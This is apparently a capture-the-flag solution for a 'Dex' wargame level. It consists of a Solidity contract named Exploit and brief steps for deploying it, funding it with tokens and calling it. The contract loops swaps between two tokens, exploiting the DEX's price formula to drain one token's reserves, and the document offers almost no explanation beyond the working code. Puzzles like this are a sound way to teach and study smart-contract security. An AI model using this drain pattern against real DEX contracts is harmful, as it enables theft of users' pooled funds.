Deploy the following contract to the same network
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Dex {
    function balanceOf(address, address) external view returns(uint); 
    function getSwapPrice(address,address,uint) external view returns(uint);
    function approve(address, uint) external;
    function swap(address, address, uint) external;
    function token1() external view returns(address);
    function token2() external view returns(address);
}

contract Exploit {

    function exploit (address _who) public {
        Dex dex = Dex(_who);
        address token1 = dex.token1();
        address token2 = dex.token2();
        dex.approve(_who, type(uint).max);

        dex.swap(token1, token2, dex.balanceOf(token1, address(this)));

        while (dex.balanceOf(token1, _who) != 0 && dex.balanceOf(token2, _who) != 0 ){
            uint amt;
            if (dex.balanceOf(token1, address(this)) == 0){
                amt = dex.balanceOf(token2, address(this));
                if (dex.getSwapPrice(token2, token1, amt) <= dex.balanceOf(token1, _who)){
                    dex.swap(token2, token1, amt);
                }
                else{
                    for (uint i = amt-1; i > 0; i--){
                        if (dex.getSwapPrice(token2, token1, i) <= dex.balanceOf(token1, _who)){
                            dex.swap(token2, token1, i);
                            break;
                        }
                    }
                }
            }
            else{
                amt = dex.balanceOf(token1, address(this));
                if (dex.getSwapPrice(token1, token2, amt) <= dex.balanceOf(token2, _who)){
                    dex.swap(token1, token2, amt);
                }
                else{
                    for (uint i = amt-1; i > 0; i--){
                        if (dex.getSwapPrice(token1, token2, i) <= dex.balanceOf(token2, _who)){
                            dex.swap(token1, token2, i);
                            break;
                        }
                    }
                }
            }
        }
    }
}
```
- Send all your token1 and token2 balances to the contract
- Call exploit() sending your contract instance
